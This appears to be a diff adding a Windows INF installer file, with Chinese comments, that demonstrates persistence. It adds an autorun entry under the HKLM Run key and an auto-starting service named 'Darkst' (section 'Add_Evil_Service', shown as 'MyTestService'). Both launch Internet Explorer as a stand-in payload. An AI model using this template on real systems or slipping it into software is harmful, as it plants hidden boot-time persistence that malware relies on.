@@ -1,0 +1,24 @@
+[version]
+signature="$CHICAGO$"
+AdvancedINF=2.0
+
+[DefaultInstall]
+AddReg=Add
+
+[Add]
+HKLM,"SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HelpTry",%REG_SZ%,c:\Program Files\Internet Explorer\IEXPLORE.EXE
+
+[Strings]
+REG_SZ=0x00000000
+
+[DefaultInstall.Services]
+AddService=Darkst,,Add_Evil_Service ;服务名称
+
+
+[Add_Evil_Service]
+DisplayName=MyTestService ;显示名称
+Description=My Test Service;服务描述
+ServiceType=0x10 ;服务类型
+StartType=2 ;启动类型
+ErrorControl=0 ;错误控制
+ServiceBinary=c:\Program Files\Internet Explorer\IEXPLORE.EXE ;服务要加载的exe文件路径
